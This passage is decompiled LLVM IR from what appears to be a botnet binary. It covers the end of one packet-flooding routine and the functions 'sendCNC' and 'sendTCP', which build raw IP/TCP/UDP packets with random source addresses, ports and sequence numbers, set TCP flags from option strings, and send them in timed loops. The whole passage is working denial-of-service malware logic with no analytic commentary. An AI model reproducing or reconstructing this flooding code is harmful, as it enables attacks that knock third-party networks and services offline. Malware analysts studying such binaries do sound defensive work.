  %v1_10490 = add i32 %v3_1047c, 42
  %v3_10494 = and i32 %v1_10490, -8
  %v1_1049c = load i32, i32* @sp, align 4
  %v2_1049c = sub i32 %v1_1049c, %v3_10494
  %v1_104a0 = add i32 %v2_1049c, 8
  store i32 %v1_104a0, i32* %r2.global-to-local, align 4
  %v1_104ac = add i32 %v2_1049c, 15
  %v3_104b0 = and i32 %v1_104ac, -8
  %v1_104d0 = add i32 %v3_104b0, 20
  %v5_104d4 = inttoptr i32 %v1_104d0 to i16*
  %v3_104d8 = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_104d8, i32* @r4, align 4
  %v1_104e0 = call i32 @HackerScan2(i32 %storemerge10)
  %v1_104ec = call i32 @__GI_htonl(i32 %v1_104e0)
  store i32 %v1_104ec, i32* %r2.global-to-local, align 4
  %v3_104f4 = load i32, i32* %stack_var_0, align 4
  %v1_104f8 = add i32 %v3_104f4, 8
  %v1_104fc = load i32, i32* @sp, align 4
  %v2_104fc = inttoptr i32 %v1_104fc to i32*
  store i32 %v1_104f8, i32* %v2_104fc, align 4
  %v0_10504 = load i32, i32* @r4, align 4
  %v4_1050c = inttoptr i32 %v3_104b0 to i8*
  %v5_1050c = call i32 @makeIPPacket(i8* %v4_1050c, i32 %v0_10504, i32 %v1_104ec, i32 17)
  %v3_10510 = load i32, i32* %stack_var_0, align 4
  %fold = add i32 %v3_10510, 8
  %v3_10524 = urem i32 %fold, 65536
  %v1_1052c = call i32 @__GI_htons(i32 %v3_10524)
  %sext = mul i32 %v1_1052c, 65536
  %v1_10530 = sdiv i32 %sext, 65536
  store i32 %v1_10530, i32* %r2.global-to-local, align 4
  %v1_1053c = trunc i32 %v1_10530 to i16
  %v3_1053c = add i32 %v3_104b0, 24
  %v4_1053c = inttoptr i32 %v3_1053c to i16*
  store i16 %v1_1053c, i16* %v4_1053c, align 8
  %v0_10540 = call i32 @rand_cmwc()
  %v3_1054c = urem i32 %v0_10540, 65536
  store i32 %v3_1054c, i32* %r2.global-to-local, align 4
  %v1_10554 = trunc i32 %v0_10540 to i16
  store i16 %v1_10554, i16* %v5_104d4, align 4
  br i1 %v2_101ac, label %dec_label_pc_10564, label %dec_label_pc_1057c

dec_label_pc_10564:                               ; preds = %dec_label_pc_1047c
  %v0_10564 = call i32 @rand_cmwc()
  %extract.t = trunc i32 %v0_10564 to i16
  br label %dec_label_pc_10598

dec_label_pc_1057c:                               ; preds = %dec_label_pc_1047c
  %v3_10584 = urem i32 %arg2, 65536
  %v1_1058c = call i32 @__GI_htons(i32 %v3_10584)
  %extract.t79 = trunc i32 %v1_1058c to i16
  br label %dec_label_pc_10598

dec_label_pc_10598:                               ; preds = %dec_label_pc_10564, %dec_label_pc_1057c
  %v0_10564.sink.off0 = phi i16 [ %extract.t, %dec_label_pc_10564 ], [ %extract.t79, %dec_label_pc_1057c ]
  %v3_1067c.pre-phi = phi i32 [ 0, %dec_label_pc_10564 ], [ %v3_10584, %dec_label_pc_1057c ]
  %v3_105a0 = add i32 %v3_104b0, 22
  %v4_105a0 = inttoptr i32 %v3_105a0 to i16*
  store i16 %v0_10564.sink.off0, i16* %v4_105a0, align 2
  store i32 %v1_104d0, i32* %r2.global-to-local, align 4
  %v3_105ac = add i32 %v3_104b0, 26
  %v4_105ac = inttoptr i32 %v3_105ac to i16*
  store i16 0, i16* %v4_105ac, align 2
  %v1_105b4 = add i32 %v3_104b0, 28
  %v3_105bc = load i32, i32* %stack_var_0, align 4
  %v2_105c0 = call i32 @makeRandomStr(i32 %v1_105b4, i32 %v3_105bc)
  store i32 %v3_104b0, i32* %r2.global-to-local, align 4
  %v1_105d0 = or i32 %v3_104b0, 2
  %v2_105d0 = inttoptr i32 %v1_105d0 to i16*
  %v3_105d0 = load i16, i16* %v2_105d0, align 2
  %v4_105d0 = zext i16 %v3_105d0 to i32
  %v2_105dc = inttoptr i32 %v3_104b0 to i16*
  %v3_105dc = call i32 @csum(i16* %v2_105dc, i32 %v4_105d0)
  %sext4 = mul i32 %v3_105dc, 65536
  %v1_105e0 = sdiv i32 %sext4, 65536
  store i32 %v1_105e0, i32* %r2.global-to-local, align 4
  %v1_105ec = trunc i32 %v1_105e0 to i16
  %v3_105ec = add i32 %v3_104b0, 10
  %v4_105ec = inttoptr i32 %v3_105ec to i16*
  store i16 %v1_105ec, i16* %v4_105ec, align 2
  %v2_105f4 = call i32 @__GI_time(i32* null)
  store i32 %v2_105f4, i32* %r2.global-to-local, align 4
  %v2_10600 = add i32 %v2_105f4, %arg3
  %v2_10614 = ptrtoint i32* %stack_var_-80 to i32
  %v3_106b0 = or i32 %v3_104b0, 4
  %v4_106b0 = inttoptr i32 %v3_106b0 to i16*
  %v2_106d0 = add i32 %v3_104b0, 12
  %v3_106d0 = inttoptr i32 %v2_106d0 to i32*
  br label %dec_label_pc_10610

dec_label_pc_10610:                               ; preds = %dec_label_pc_10734, %dec_label_pc_10728, %dec_label_pc_10598
  %stack_var_-108.0 = phi i32 [ 0, %dec_label_pc_10598 ], [ 0, %dec_label_pc_10728 ], [ %v1_10738, %dec_label_pc_10734 ]
  store i32 %v3_104b0, i32* %r2.global-to-local, align 4
  %v1_10618 = load i32, i32* @sp, align 4
  %v2_10618 = inttoptr i32 %v1_10618 to i32*
  store i32 %v2_10614, i32* %v2_10618, align 4
  %v1_10620 = load i32, i32* @sp, align 4
  %v2_10620 = add i32 %v1_10620, 4
  %v3_10620 = inttoptr i32 %v2_10620 to i32*
  store i32 16, i32* %v3_10620, align 4
  %v0_10628 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_10480, i32* %r2.global-to-local, align 4
  %v6_10634 = call i32 @__libc_sendto(i32 %v3_10378, i32 %v0_10628, i32 %v1_10480, i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_10638 = call i32 @rand_cmwc()
  %v3_10644 = urem i32 %v0_10638, 65536
  store i32 %v3_10644, i32* %r2.global-to-local, align 4
  %v1_1064c = trunc i32 %v0_10638 to i16
  store i16 %v1_1064c, i16* %v5_104d4, align 4
  br i1 %v2_101ac, label %dec_label_pc_1065c, label %dec_label_pc_10674

dec_label_pc_1065c:                               ; preds = %dec_label_pc_10610
  %v0_1065c = call i32 @rand_cmwc()
  %extract.t80 = trunc i32 %v0_1065c to i16
  br label %dec_label_pc_10690

dec_label_pc_10674:                               ; preds = %dec_label_pc_10610
  %v1_10684 = call i32 @__GI_htons(i32 %v3_1067c.pre-phi)
  %extract.t81 = trunc i32 %v1_10684 to i16
  br label %dec_label_pc_10690

dec_label_pc_10690:                               ; preds = %dec_label_pc_1065c, %dec_label_pc_10674
  %v0_1065c.sink.off0 = phi i16 [ %extract.t80, %dec_label_pc_1065c ], [ %extract.t81, %dec_label_pc_10674 ]
  %v4_10694 = sext i16 %v0_1065c.sink.off0 to i32
  store i32 %v4_10694, i32* %r2.global-to-local, align 4
  store i16 %v0_1065c.sink.off0, i16* %v4_105a0, align 2
  %v0_1069c = call i32 @rand_cmwc()
  %v3_106a8 = urem i32 %v0_1069c, 65536
  store i32 %v3_106a8, i32* %r2.global-to-local, align 4
  %v1_106b0 = trunc i32 %v0_1069c to i16
  store i16 %v1_106b0, i16* %v4_106b0, align 4
  %v1_106b8 = call i32 @HackerScan2(i32 %storemerge10)
  %v1_106c4 = call i32 @__GI_htonl(i32 %v1_106b8)
  store i32 %v1_106c4, i32* %v3_106d0, align 4
  store i32 %v3_104b0, i32* %r2.global-to-local, align 4
  %v3_106e0 = load i16, i16* %v2_105d0, align 2
  %v4_106e0 = zext i16 %v3_106e0 to i32
  %v3_106ec = call i32 @csum(i16* %v2_105dc, i32 %v4_106e0)
  %v1_106fc = trunc i32 %v3_106ec to i16
  store i16 %v1_106fc, i16* %v4_105ec, align 2
  store i32 %arg6, i32* %r2.global-to-local, align 4
  %v9_10708 = icmp eq i32 %stack_var_-108.0, %arg6
  br i1 %v9_10708, label %dec_label_pc_10710, label %dec_label_pc_10734

dec_label_pc_10710:                               ; preds = %dec_label_pc_10690
  %v2_10714 = call i32 @__GI_time(i32* null)
  store i32 %v2_10714, i32* %r2.global-to-local, align 4
  %v8_10724 = icmp sgt i32 %v2_10714, %v2_10600
  br i1 %v8_10724, label %dec_label_pc_10744, label %dec_label_pc_10728

dec_label_pc_10728:                               ; preds = %dec_label_pc_10710
  br label %dec_label_pc_10610

dec_label_pc_10734:                               ; preds = %dec_label_pc_10690
  %v1_10738 = add i32 %stack_var_-108.0, 1
  store i32 %v1_10738, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10610

dec_label_pc_10744:                               ; preds = %dec_label_pc_10710, %dec_label_pc_103dc, %dec_label_pc_10390
  %v1_1075026 = phi i32 [ %v3_103ec, %dec_label_pc_103dc ], [ %v3_103a0, %dec_label_pc_10390 ], [ %v2_10714, %dec_label_pc_10710 ]
  br label %dec_label_pc_10748

dec_label_pc_10748:                               ; preds = %dec_label_pc_10330, %dec_label_pc_101e8, %dec_label_pc_10270, %dec_label_pc_10258, %dec_label_pc_10744
  %v1_10750 = phi i32 [ %v3_101f8, %dec_label_pc_101e8 ], [ 0, %dec_label_pc_10270 ], [ %v3_10268, %dec_label_pc_10258 ], [ %v1_1075026, %dec_label_pc_10744 ], [ %v2_10334, %dec_label_pc_10330 ]
  ret i32 %v1_10750

; uselistorder directives
  uselistorder i32 %v1_10738, { 1, 0 }
  uselistorder i32 %v0_1069c, { 1, 0 }
  uselistorder i16 %v0_1065c.sink.off0, { 1, 0 }
  uselistorder i32 %v0_10638, { 1, 0 }
  uselistorder i32 %v1_105e0, { 1, 0 }
  uselistorder i32 %v3_10584, { 1, 0 }
  uselistorder i32 %v0_10540, { 1, 0 }
  uselistorder i32 %v1_10530, { 1, 0 }
  uselistorder i32 %v3_104b0, { 6, 4, 5, 12, 3, 13, 11, 2, 10, 9, 8, 7, 1, 0 }
  uselistorder i32 %v1_10480, { 1, 0 }
  uselistorder i32 %v3_102d8, { 1, 0 }
  uselistorder i32 %stack_var_-112.0, { 0, 2, 1 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-80, { 1, 2, 0 }
  uselistorder i32* %stack_var_-76, { 1, 0 }
  uselistorder i32* %stack_var_-84, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 0 }
  uselistorder i32 26, { 1, 2, 0 }
  uselistorder i32 ()* @rand, { 3, 2, 1, 0, 12, 11, 10, 9, 8, 7, 6, 5, 4 }
  uselistorder i32 49, { 0, 2, 1 }
  uselistorder i32 %arg6, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10748, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_10690, { 1, 0 }
  uselistorder label %dec_label_pc_10598, { 1, 0 }
  uselistorder label %dec_label_pc_1047c, { 1, 0 }
  uselistorder label %dec_label_pc_10400, { 1, 0 }
  uselistorder label %dec_label_pc_10330, { 1, 0 }
  uselistorder label %dec_label_pc_101e8, { 1, 0 }
}

define i32 @sendCNC(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10780 = call i32 @__GI_time(i32* null)
  %v2_1078c = add i32 %v2_10780, %arg3
  store i32 %arg1, i32* @r0, align 4
  %v1_1079c = call i32 @inet_addr(i32 %arg1)
  store i32 2, i32* %stack_var_-40, align 4
  %v3_107b8 = urem i32 %arg2, 65536
  %v1_107c0 = call i32 @__GI_htons(i32 %v3_107b8)
  %v2_107e8 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_1080c

dec_label_pc_107d0:                               ; preds = %dec_label_pc_1080c
  %v3_107dc = call i32 @socket(i32 2, i32 1, i32 0)
  %v3_107f8 = call i32 @__libc_connect(i32 %v3_107dc, i32 %v2_107e8, i32 16)
  %v1_10800 = call i32 @sleep(i32 1)
  %v1_10808 = call i32 @__GI_close(i32 %v3_107dc)
  br label %dec_label_pc_1080c

dec_label_pc_1080c:                               ; preds = %entry, %dec_label_pc_107d0
  %v2_10810 = call i32 @__GI_time(i32* null)
  %v5_10820 = icmp slt i32 %v2_10810, %v2_1078c
  br i1 %v5_10820, label %dec_label_pc_107d0, label %dec_label_pc_10824

dec_label_pc_10824:                               ; preds = %dec_label_pc_1080c
  ret i32 %v2_10810

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1080c, { 1, 0 }
}

define i32 @sendTCP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  store i32 67644, i32* %stack_var_-4, align 4
  %v2_10838 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_10838, i32* @fp, align 4
  store i32 2, i32* %stack_var_-68, align 4
  %v2_1086c = icmp eq i32 %arg2, 0
  br i1 %v2_1086c, label %dec_label_pc_10874, label %dec_label_pc_1088c

dec_label_pc_10874:                               ; preds = %entry
  %v0_10874 = call i32 @rand_cmwc()
  br label %dec_label_pc_108a8

dec_label_pc_1088c:                               ; preds = %entry
  %v3_10894 = urem i32 %arg2, 65536
  %v1_1089c = call i32 @__GI_htons(i32 %v3_10894)
  br label %dec_label_pc_108a8

dec_label_pc_108a8:                               ; preds = %dec_label_pc_10874, %dec_label_pc_1088c
  %v3_108b8 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-64)
  %v2_108c0 = icmp eq i32 %v3_108b8, 0
  br i1 %v2_108c0, label %dec_label_pc_108cc, label %dec_label_pc_10f08

dec_label_pc_108cc:                               ; preds = %dec_label_pc_108a8
  store i32 8, i32* @r2, align 4
  %v2_108e0 = bitcast i32* %stack_var_-60 to i8*
  %v3_108e0 = call i32 @__GI_memset(i8* %v2_108e0, i32 0)
  store i32 6, i32* @r2, align 4
  %v3_108f0 = call i32 @socket(i32 2, i32 3, i32 6)
  %v2_10900 = icmp eq i32 %v3_108f0, 0
  br i1 %v2_10900, label %dec_label_pc_10908, label %dec_label_pc_10920

dec_label_pc_10908:                               ; preds = %dec_label_pc_108cc
  %v2_1090c = load i32, i32* @global_var_2e4e0.53, align 4
  %v3_10918 = call i32 @HackerPrint(i32 %v2_1090c, i32 ptrtoint ([27 x i8]* @global_var_24498.1179 to i32))
  br label %dec_label_pc_10f08

dec_label_pc_10920:                               ; preds = %dec_label_pc_108cc
  store i32 1, i32* %stack_var_-72, align 4
  %v2_10928 = ptrtoint i32* %stack_var_-72 to i32
  store i32 3, i32* @r2, align 4
  %v5_10944 = call i32 @__GI_setsockopt(i32 %v3_108f0, i32 0, i32 3, i32 %v2_10928, i32 4)
  %v1_1094c = icmp slt i32 %v5_10944, 0
  br i1 %v1_1094c, label %dec_label_pc_10954, label %dec_label_pc_1096c

dec_label_pc_10954:                               ; preds = %dec_label_pc_10920
  %v2_10958 = load i32, i32* @global_var_2e4e0.53, align 4
  %v3_10964 = call i32 @HackerPrint(i32 %v2_10958, i32 ptrtoint ([33 x i8]* @global_var_244b4.1181 to i32))
  br label %dec_label_pc_10f08

dec_label_pc_1096c:                               ; preds = %dec_label_pc_10920
  %v2_10970 = icmp eq i32 %arg4, 0
  br i1 %v2_10970, label %dec_label_pc_1099c, label %dec_label_pc_10984

dec_label_pc_10984:                               ; preds = %dec_label_pc_1096c
  %v1_10988 = sub i32 32, %arg4
  store i32 %v1_10988, i32* %r2.global-to-local, align 4
  %v1_10994 = shl i32 -1, %v1_10988
  br label %dec_label_pc_1099c

dec_label_pc_1099c:                               ; preds = %dec_label_pc_1096c, %dec_label_pc_10984
  %storemerge9 = phi i32 [ %v1_10994, %dec_label_pc_10984 ], [ 0, %dec_label_pc_1096c ]
  %v1_109a0 = add i32 %arg6, 40
  %v1_109b0 = add i32 %arg6, 54
  %v3_109b4 = and i32 %v1_109b0, -8
  %v1_109bc = load i32, i32* @sp, align 4
  %v2_109bc = sub i32 %v1_109bc, %v3_109b4
  %v1_109cc = add i32 %v2_109bc, 15
  %v3_109d0 = and i32 %v1_109cc, -8
  store i32 %v3_109d0, i32* %r2.global-to-local, align 4
  %v1_109f0 = add i32 %v3_109d0, 20
  %v5_109f4 = inttoptr i32 %v1_109f0 to i16*
  %v3_109f8 = load i32, i32* %stack_var_-64, align 4
  store i32 %v3_109f8, i32* @r4, align 4
  %v1_10a00 = call i32 @HackerScan2(i32 %storemerge9)
  %v1_10a0c = call i32 @__GI_htonl(i32 %v1_10a00)
  store i32 %v1_10a0c, i32* %r2.global-to-local, align 4
  %v1_10a18 = add i32 %arg6, 20
  %v1_10a1c = load i32, i32* @sp, align 4
  %v2_10a1c = inttoptr i32 %v1_10a1c to i32*
  store i32 %v1_10a18, i32* %v2_10a1c, align 4
  %v0_10a24 = load i32, i32* @r4, align 4
  %v4_10a2c = inttoptr i32 %v3_109d0 to i8*
  %v5_10a2c = call i32 @makeIPPacket(i8* %v4_10a2c, i32 %v0_10a24, i32 %v1_10a0c, i32 6)
  %v0_10a30 = call i32 @rand_cmwc()
  %v3_10a3c = urem i32 %v0_10a30, 65536
  store i32 %v3_10a3c, i32* %r2.global-to-local, align 4
  %v1_10a44 = trunc i32 %v0_10a30 to i16
  store i16 %v1_10a44, i16* %v5_109f4, align 4
  %v0_10a48 = call i32 @rand_cmwc()
  %v2_10a54 = add i32 %v3_109d0, 24
  %v3_10a54 = inttoptr i32 %v2_10a54 to i32*
  store i32 %v0_10a48, i32* %v3_10a54, align 8
  %v2_10a60 = add i32 %v3_109d0, 28
  %v3_10a60 = inttoptr i32 %v2_10a60 to i32*
  store i32 0, i32* %v3_10a60, align 4
  store i32 %v1_109f0, i32* %r2.global-to-local, align 4
  %v1_10a68 = add i32 %v3_109d0, 32
  %v2_10a68 = inttoptr i32 %v1_10a68 to i8*
  %v3_10a68 = load i8, i8* %v2_10a68, align 8
  %v1_10a74 = urem i8 %v3_10a68, 16
  %v1_10a78 = or i8 %v1_10a74, 80
  store i8 %v1_10a78, i8* %v2_10a68, align 8
  %v3_10a88 = load i32, i32* %stack_var_0, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_244d8.1186 to i32), i32* @r1, align 4
  %v3_10a94 = inttoptr i32 %v3_10a88 to i8*
  %v4_10a94 = call i32 @__GI_strcoll(i8* %v3_10a94, i32 ptrtoint ([4 x i8]* @global_var_244d8.1186 to i32))
  %v2_10a9c = icmp eq i32 %v4_10a94, 0
  br i1 %v2_10a9c, label %dec_label_pc_10aa4, label %dec_label_pc_10b5c

dec_label_pc_10aa4:                               ; preds = %dec_label_pc_1099c
  store i32 %v1_109f0, i32* %r2.global-to-local, align 4
  %v1_10aa8 = add i32 %v3_109d0, 33
  %v2_10aa8 = inttoptr i32 %v1_10aa8 to i8*
  %v3_10aa8 = load i8, i8* %v2_10aa8, align 1
  %v1_10ab8 = or i8 %v3_10aa8, 2
  store i8 %v1_10ab8, i8* %v2_10aa8, align 1
  store i32 %v1_109f0, i32* %r2.global-to-local, align 4
  %v3_10acc = load i8, i8* %v2_10aa8, align 1
  %v1_10adc = or i8 %v3_10acc, 4
  store i8 %v1_10adc, i8* %v2_10aa8, align 1
  store i32 %v1_109f0, i32* %r2.global-to-local, align 4
  %v3_10af0 = load i8, i8* %v2_10aa8, align 1
  %v1_10b00 = or i8 %v3_10af0, 1
  store i8 %v1_10b00, i8* %v2_10aa8, align 1
  store i32 %v1_109f0, i32* %r2.global-to-local, align 4
  %v3_10b14 = load i8, i8* %v2_10aa8, align 1
  %v1_10b24 = or i8 %v3_10b14, 16
  store i8 %v1_10b24, i8* %v2_10aa8, align 1
  store i32 %v1_109f0, i32* %r2.global-to-local, align 4
  %v3_10b38 = load i8, i8* %v2_10aa8, align 1
  %v1_10b48 = or i8 %v3_10b38, 8
  store i8 %v1_10b48, i8* %v2_10aa8, align 1
  br label %dec_label_pc_10d04

dec_label_pc_10b5c:                               ; preds = %dec_label_pc_1099c
  %v3_10b5c = load i32, i32* %stack_var_0, align 4
  %v2_10b68 = call i32 @__GI_strtok(i32 %v3_10b5c, i32 ptrtoint (i32* @global_var_244dc.1188 to i32))
  %v2_10cfc18 = icmp eq i32 %v2_10b68, 0
  br i1 %v2_10cfc18, label %dec_label_pc_10d04, label %dec_label_pc_10b78.lr.ph

dec_label_pc_10b78.lr.ph:                         ; preds = %dec_label_pc_10b5c
  %v1_10b98 = add i32 %v3_109d0, 33
  %v2_10b98 = inttoptr i32 %v1_10b98 to i8*
  br label %dec_label_pc_10b78

dec_label_pc_10b78:                               ; preds = %dec_label_pc_10b78.lr.ph, %dec_label_pc_10ce4
  %storemerge1319 = phi i32 [ %v2_10b68, %dec_label_pc_10b78.lr.ph ], [ %v2_10cec, %dec_label_pc_10ce4 ]
  store i32 ptrtoint ([4 x i8]* @global_var_244e0.1190 to i32), i32* @r1, align 4
  %v3_10b84 = inttoptr i32 %storemerge1319 to i8*
  %v4_10b84 = call i32 @__GI_strcoll(i8* %v3_10b84, i32 ptrtoint ([4 x i8]* @global_var_244e0.1190 to i32))
  %v2_10b8c = icmp eq i32 %v4_10b84, 0
  br i1 %v2_10b8c, label %dec_label_pc_10b94, label %dec_label_pc_10bbc

dec_label_pc_10b94:                               ; preds = %dec_label_pc_10b78
  %v3_10b98 = load i8, i8* %v2_10b98, align 1
  %v4_10ba0 = zext i8 %v3_10b98 to i32
  %v1_10ba8 = or i32 %v4_10ba0, 2
  store i32 %v1_10ba8, i32* %r2.global-to-local, align 4
  %v1_10bb4 = trunc i32 %v1_10ba8 to i8
  store i8 %v1_10bb4, i8* %v2_10b98, align 1
  br label %dec_label_pc_10ce4

dec_label_pc_10bbc:                               ; preds = %dec_label_pc_10b78
  store i32 ptrtoint ([4 x i8]* @global_var_244e4.1192 to i32), i32* @r1, align 4
  %v4_10bc8 = call i32 @__GI_strcoll(i8* %v3_10b84, i32 ptrtoint ([4 x i8]* @global_var_244e4.1192 to i32))
  %v2_10bd0 = icmp eq i32 %v4_10bc8, 0
  br i1 %v2_10bd0, label %dec_label_pc_10bd8, label %dec_label_pc_10c00

dec_label_pc_10bd8:                               ; preds = %dec_label_pc_10bbc
  %v3_10bdc = load i8, i8* %v2_10b98, align 1
  %v4_10be4 = zext i8 %v3_10bdc to i32
  %v1_10bec = or i32 %v4_10be4, 4
  store i32 %v1_10bec, i32* %r2.global-to-local, align 4
  %v1_10bf8 = trunc i32 %v1_10bec to i8
  store i8 %v1_10bf8, i8* %v2_10b98, align 1
  br label %dec_label_pc_10ce4

dec_label_pc_10c00:                               ; preds = %dec_label_pc_10bbc
  store i32 ptrtoint ([4 x i8]* @global_var_244e8.1194 to i32), i32* @r1, align 4
  %v4_10c0c = call i32 @__GI_strcoll(i8* %v3_10b84, i32 ptrtoint ([4 x i8]* @global_var_244e8.1194 to i32))
  %v2_10c14 = icmp eq i32 %v4_10c0c, 0
  br i1 %v2_10c14, label %dec_label_pc_10c1c, label %dec_label_pc_10c44

dec_label_pc_10c1c:                               ; preds = %dec_label_pc_10c00
  %v3_10c20 = load i8, i8* %v2_10b98, align 1
  %v4_10c28 = zext i8 %v3_10c20 to i32
  %v1_10c30 = or i32 %v4_10c28, 1
  store i32 %v1_10c30, i32* %r2.global-to-local, align 4
  %v1_10c3c = trunc i32 %v1_10c30 to i8
  store i8 %v1_10c3c, i8* %v2_10b98, align 1
  br label %dec_label_pc_10ce4

dec_label_pc_10c44:                               ; preds = %dec_label_pc_10c00
  store i32 ptrtoint ([4 x i8]* @global_var_244ec.1196 to i32), i32* @r1, align 4
  %v4_10c50 = call i32 @__GI_strcoll(i8* %v3_10b84, i32 ptrtoint ([4 x i8]* @global_var_244ec.1196 to i32))
  %v2_10c58 = icmp eq i32 %v4_10c50, 0
  br i1 %v2_10c58, label %dec_label_pc_10c60, label %dec_label_pc_10c88

dec_label_pc_10c60:                               ; preds = %dec_label_pc_10c44
  %v3_10c64 = load i8, i8* %v2_10b98, align 1
  %v4_10c6c = zext i8 %v3_10c64 to i32
  %v1_10c74 = or i32 %v4_10c6c, 16
  store i32 %v1_10c74, i32* %r2.global-to-local, align 4
  %v1_10c80 = trunc i32 %v1_10c74 to i8
  store i8 %v1_10c80, i8* %v2_10b98, align 1
  br label %dec_label_pc_10ce4

dec_label_pc_10c88:                               ; preds = %dec_label_pc_10c44
  store i32 ptrtoint ([4 x i8]* @global_var_244f0.1198 to i32), i32* @r1, align 4
  %v4_10c94 = call i32 @__GI_strcoll(i8* %v3_10b84, i32 ptrtoint ([4 x i8]* @global_var_244f0.1198 to i32))
  %v2_10c9c = icmp eq i32 %v4_10c94, 0
  br i1 %v2_10c9c, label %dec_label_pc_10ca4, label %dec_label_pc_10ccc

dec_label_pc_10ca4:                               ; preds = %dec_label_pc_10c88
  %v3_10ca8 = load i8, i8* %v2_10b98, align 1
  %v4_10cb0 = zext i8 %v3_10ca8 to i32
  %v1_10cb8 = or i32 %v4_10cb0, 8
  store i32 %v1_10cb8, i32* %r2.global-to-local, align 4
  %v1_10cc4 = trunc i32 %v1_10cb8 to i8
  store i8 %v1_10cc4, i8* %v2_10b98, align 1
  br label %dec_label_pc_10ce4

dec_label_pc_10ccc:                               ; preds = %dec_label_pc_10c88
  %v2_10cd0 = load i32, i32* @global_var_2e4e0.53, align 4
  store i32 %storemerge1319, i32* @r2, align 4
  %v3_10ce0 = call i32 @HackerPrint(i32 %v2_10cd0, i32 ptrtoint ([18 x i8]* @global_var_244f4.1200 to i32))
  br label %dec_label_pc_10ce4

dec_label_pc_10ce4:                               ; preds = %dec_label_pc_10ca4, %dec_label_pc_10c60, %dec_label_pc_10c1c, %dec_label_pc_10bd8, %dec_label_pc_10b94, %dec_label_pc_10ccc
  %v2_10cec = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_244dc.1188 to i32))
  %v2_10cfc = icmp eq i32 %v2_10cec, 0
  br i1 %v2_10cfc, label %dec_label_pc_10d04, label %dec_label_pc_10b78

dec_label_pc_10d04:                               ; preds = %dec_label_pc_10ce4, %dec_label_pc_10b5c, %dec_label_pc_10aa4
  %v0_10d04 = call i32 @rand_cmwc()
  %v1_10d18 = trunc i32 %v0_10d04 to i16
  %v3_10d18 = add i32 %v3_109d0, 34
  %v4_10d18 = inttoptr i32 %v3_10d18 to i16*
  store i16 %v1_10d18, i16* %v4_10d18, align 2
  %v3_10d24 = add i32 %v3_109d0, 36
  %v4_10d24 = inttoptr i32 %v3_10d24 to i16*
  store i16 0, i16* %v4_10d24, align 4
  store i32 %v1_109f0, i32* %r2.global-to-local, align 4
  %v3_10d30 = add i32 %v3_109d0, 38
  %v4_10d30 = inttoptr i32 %v3_10d30 to i16*
  store i16 0, i16* %v4_10d30, align 2
  br i1 %v2_1086c, label %dec_label_pc_10d40, label %dec_label_pc_10d58

dec_label_pc_10d40:                               ; preds = %dec_label_pc_10d04
  %v0_10d40 = call i32 @rand_cmwc()
  %extract.t = trunc i32 %v0_10d40 to i16
  br label %dec_label_pc_10d74

dec_label_pc_10d58:                               ; preds = %dec_label_pc_10d04
  %v3_10d60 = urem i32 %arg2, 65536
  %v1_10d68 = call i32 @__GI_htons(i32 %v3_10d60)
  %extract.t72 = trunc i32 %v1_10d68 to i16
  br label %dec_label_pc_10d74

dec_label_pc_10d74:                               ; preds = %dec_label_pc_10d40, %dec_label_pc_10d58
  %v0_10d40.sink.off0 = phi i16 [ %extract.t, %dec_label_pc_10d40 ], [ %extract.t72, %dec_label_pc_10d58 ]
  %v3_10d7c = add i32 %v3_109d0, 22
  %v4_10d7c = inttoptr i32 %v3_10d7c to i16*
  store i16 %v0_10d40.sink.off0, i16* %v4_10d7c, align 2
  %v2_10d88 = call i32 @tcpcsum(i32 %v3_109d0, i32 %v1_109f0)
  %v1_10d98 = trunc i32 %v2_10d88 to i16
  store i16 %v1_10d98, i16* %v4_10d24, align 4
  store i32 %v3_109d0, i32* %r2.global-to-local, align 4
  %v1_10da8 = or i32 %v3_109d0, 2
  %v2_10da8 = inttoptr i32 %v1_10da8 to i16*
  %v3_10da8 = load i16, i16* %v2_10da8, align 2
  %v4_10da8 = zext i16 %v3_10da8 to i32
  %v2_10db4 = inttoptr i32 %v3_109d0 to i16*
  %v3_10db4 = call i32 @csum(i16* %v2_10db4, i32 %v4_10da8)
  %sext3 = mul i32 %v3_10db4, 65536
  %v1_10db8 = sdiv i32 %sext3, 65536
  store i32 %v1_10db8, i32* %r2.global-to-local, align 4
  %v1_10dc4 = trunc i32 %v1_10db8 to i16
  %v3_10dc4 = add i32 %v3_109d0, 10
  %v4_10dc4 = inttoptr i32 %v3_10dc4 to i16*
  store i16 %v1_10dc4, i16* %v4_10dc4, align 2
  %v2_10dcc = call i32 @__GI_time(i32* null)
  %v2_10dd8 = add i32 %v2_10dcc, %arg3
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_10dec = ptrtoint i32* %stack_var_-68 to i32
  %v2_10e2c = add i32 %v3_109d0, 12
  %v3_10e2c = inttoptr i32 %v2_10e2c to i32*
  %v3_10e44 = or i32 %v3_109d0, 4
